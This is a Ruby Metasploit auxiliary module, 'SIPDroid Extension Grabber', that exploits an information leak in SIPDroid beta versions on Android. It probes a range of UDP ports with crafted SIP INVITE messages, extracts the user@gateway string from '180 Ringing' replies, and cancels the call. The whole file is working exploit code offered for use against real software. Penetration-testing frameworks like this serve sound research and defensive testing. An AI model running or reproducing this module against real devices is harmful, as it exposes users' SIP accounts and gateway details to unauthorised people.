##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Udp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'SIPDroid Extension Grabber',
      'Description'    => %q{
        This module exploits a leak of extension/SIP Gateway
      on SIPDroid 1.6.1 beta, 2.0.1 beta, 2.2 beta (tested in Android 2.1 and 2.2 - official Motorola release)
      (other versions may be affected).
        },
      'Author'         => 'Anibal Aguiar <anibal.aguiar[at]gmail.com>',
      'References'     =>
        [
          ['BID', '47710'],
          ['URL', 'http://seclists.org/fulldisclosure/2011/May/83'],
        ]
      ))

    register_options(
      [
        OptInt.new('STRTPORT',  [true, 'The start probe port', 59150]),
        OptInt.new('FNLPORT',   [true, 'The final probe port', 59159]),
        OptInt.new('RPORT',     [false, 'Remote port to probe', nil]),
      ], self.class)
  end

  def create_probe(ip, meth, branch, tag, callid)
    suser = Rex::Text.rand_text_alphanumeric(rand(8)+1)
    shost = Rex::Socket.source_address(ip)
    src	  = "#{shost}:5060"

    if branch.nil?
      branch = "z9hG4bK#{"%.8x" % rand(0x100000000)}"
    end

    if tag.nil?
      tag = "as#{rand(0x100000)}"
    end

    if callid.nil?
      callid = rand(0x100000000)
    end

    @branch = branch
    @tag = tag
    @callid = callid

    data  = "#{meth} sip:#{ip} SIP/2.0\r\n"
    data << "Via: SIP/2.0/UDP #{src};branch=#{branch};rport\r\n"
    data << "Content-Length: 0\r\n"
    data << "From: \"SIPDROID\";tag=#{tag}\r\n"
    data << "Accept: application/sdp\r\n"
    data << "User-Agent: SIPDROID\r\n"
    data << "To: sip:#{ip}\r\n"
    data << "Contact: \r\n"
    data << "CSeq: 1 #{meth}\r\n"
    data << "Call-ID: #{callid}@#{shost}\r\n"
    data << "Max-Forwards: 70\r\n"

    return data
  end

  def run()
    strtport = datastore['STRTPORT']
    fnlport = datastore['FNLPORT']

    print_status("Trying target #{datastore['RHOST']}...")
    while strtport <= fnlport
      rcv = 'nothing'
      begin
        datastore['RPORT'] = strtport

        connect_udp
        data = create_probe(datastore['RHOST'], 'INVITE', nil, nil, nil)
        udp_sock.put(data)

        while not rcv.nil?
          msg = udp_sock.recvfrom(1024, 4)
          if not msg[0].eql?("")
            if msg[0].include?("SIP/2.0 180 Ringing")
              origin = /o=\w+\@[\w+\.]+/.match(msg[0])

              if not origin.nil?
                print_good(/\w+\@[\w+\.]+/.match(origin.to_s).to_s)
              else
                print_status("Ringing message received but no user/gateway sent...")
              end

              data = create_probe(datastore['RHOST'], 'CANCEL', @branch, @tag, @callid)
              udp_sock.put(data)
              strtport = fnlport + 1
              rcv = nil
            end
          else
            break
          end
        end
      rescue ::Exception => e
        disconnect_udp
        if strtport == fnlport
          print_status("Tested all ports got no response, try a bigger port range.")
        end
      ensure
        if strtport == fnlport and not rcv.nil?
          print_status("Tested all ports got no response, try a bigger port range.")
        end
        disconnect_udp
        strtport += 1
      end
    end
  end
end
